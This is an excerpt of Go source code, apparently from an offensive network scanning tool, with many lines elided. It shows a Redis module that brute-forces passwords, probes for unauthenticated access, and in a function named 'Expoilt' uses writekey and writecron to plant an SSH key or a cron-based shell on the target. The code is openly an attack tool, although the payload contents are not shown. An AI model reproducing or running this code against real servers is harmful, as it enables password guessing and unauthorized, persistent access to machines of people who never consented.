...
func RedisScan(info *common2.HostInfo) (tmperr error) {
	...
	for _, pass := range common2.Passwords {
		...
		if flag == true && err == nil {
			...
			if time.Now().Unix()-starttime > (int64(len(common2.Passwords)) * common2.Timeout) {
				return err
			}
		}
	}
...
func RedisConn(info *common2.HostInfo, pass string) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	conn, err := common2.WrapperTcpWithTimeout("tcp", realhost, time.Duration(common2.Timeout)*time.Second)
	if err != nil {
		return flag, err
	}
	defer conn.Close()
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(common2.Timeout) * time.Second))
	if err != nil {
		return flag, err
	}
...
func RedisUnauth(info *common2.HostInfo) (flag bool, err error) {
	flag = false
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	conn, err := common2.WrapperTcpWithTimeout("tcp", realhost, time.Duration(common2.Timeout)*time.Second)
	if err != nil {
...
func Expoilt(realhost string, conn net.Conn) error {
	...
	if flagSsh == true {
		...
		common2.LogSuccess(result)
		if common2.RedisFile != "" {
			writeok, text, err := writekey(conn, common2.RedisFile)
			if err != nil {
	...
	if flagCron == true {
		...
		common2.LogSuccess(result)
		if common2.RedisShell != "" {
			writeok, text, err := writecron(conn, common2.RedisShell)
			if err != nil {
				return err
			}
			if writeok {
